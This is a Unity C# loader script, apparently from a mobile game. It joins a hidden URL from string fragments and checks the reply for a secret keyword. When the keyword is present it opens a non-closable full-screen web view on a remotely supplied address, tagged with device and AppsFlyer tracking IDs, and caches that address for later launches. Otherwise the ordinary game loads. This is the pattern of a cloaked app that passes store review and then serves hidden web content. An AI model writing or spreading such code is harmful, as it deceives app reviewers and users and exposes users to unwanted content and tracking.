using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class mainloadmanager : MonoBehaviour
{
    public List<string> mainScreenLoaderString;
    private string idfaCaptainCandiesKey = "";

    private IEnumerator Start()
    {
        yield return new WaitForSeconds(3);
        string data = PlayerPrefs.GetString("tarameters", "");
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("mainScreenLoadData", string.Empty) != string.Empty)
            {
                OnLaunchMainScreen(PlayerPrefs.GetString("mainScreenLoadData"));
            }
            else
            {
                string stringtemp = "";
                foreach (var item in mainScreenLoaderString)
                {
                    stringtemp += item;
                }
                StartCoroutine(LaunchMainInitialization(stringtemp, data));
            }
        }
        else
        {
            LoadSecondScreenScene();
        }
    }

    public void LoadSecondScreenScene()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Loading");
    }

    public IEnumerator LaunchMainInitialization(string inputstring, string inputstring2)
    {
        using (UnityWebRequest mainloadmanagerStatus = UnityWebRequest.Get(inputstring))
        {
            mainloadmanagerStatus.timeout = 4;
            yield return mainloadmanagerStatus.SendWebRequest();
            if (mainloadmanagerStatus.isNetworkError)
            {
                LoadSecondScreenScene();
            }
            else
            {
                try
                {
                    if (mainloadmanagerStatus.result == UnityWebRequest.Result.Success)
                    {
                        if (mainloadmanagerStatus.downloadHandler.text.Contains("tropagola"))
                        {
                            try
                            {
                                string[] key = mainloadmanagerStatus.downloadHandler.text.Split('|');
                                OnLaunchMainScreen($"{key[0]}?idfa={idfaCaptainCandiesKey}&gaid={AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2}", Convert.ToInt32(key[1]), Convert.ToInt32(key[2]));
                            }
                            catch
                            {
                                OnLaunchMainScreen($"{mainloadmanagerStatus.downloadHandler.text}?idfa={idfaCaptainCandiesKey}&gaid={AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2}");
                            }
                        }
                        else
                        {
                            LoadSecondScreenScene();
                        }
                    }
                    else
                    {
                        LoadSecondScreenScene();
                    }
                }
                catch
                {
                    LoadSecondScreenScene();
                }
            }
        }
    }

    private void OnLaunchMainScreen(string inputKey,int parametOne = 0,int parametrTwo = 70)
    {
        var mainScreenframe = gameObject.AddComponent<UniWebView>();
        mainScreenframe.SetContentInsetAdjustmentBehavior(UniWebViewContentInsetAdjustmentBehavior.Automatic);
        mainScreenframe.SetZoomEnabled(true);
        if (parametOne == 1)
        {
            mainScreenframe.SetShowToolbar(false);
        }
        else
        {
            mainScreenframe.SetShowToolbar(true, false, false, true);
        }
        mainScreenframe.SetToolbarDoneButtonText("");
        mainScreenframe.SetSupportMultipleWindows(true);
        mainScreenframe.Frame = new Rect(0, parametrTwo, Screen.width, Screen.height - parametrTwo);
        mainScreenframe.OnShouldClose += (view) =>
        {
            return false;
        };
        mainScreenframe.OnOrientationChanged += (view, orientation) =>
        {
            mainScreenframe.Frame = new Rect(0, parametrTwo, Screen.width, Screen.height - parametrTwo);
        };
        mainScreenframe.SetSupportMultipleWindows(true);
        mainScreenframe.OnMultipleWindowOpened += (view, windowId) =>
        {
            mainScreenframe.SetShowToolbar(true);
        };
        mainScreenframe.OnMultipleWindowClosed += (view, windowId) =>
        {
            if (parametOne == 1)
            {
                mainScreenframe.SetShowToolbar(false);
            }
            else
            {
                mainScreenframe.SetShowToolbar(true, false, false, true);
            }
        };
        mainScreenframe.SetAllowBackForwardNavigationGestures(true);
        mainScreenframe.OnPageFinished += (view, statusCode, url) =>
        {
            mainScreenframe.UpdateFrame();
            if (PlayerPrefs.GetString("mainScreenLoadData", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("mainScreenLoadData", url);
            }
        };
        mainScreenframe.Load(inputKey);
        mainScreenframe.Show();
    }
}
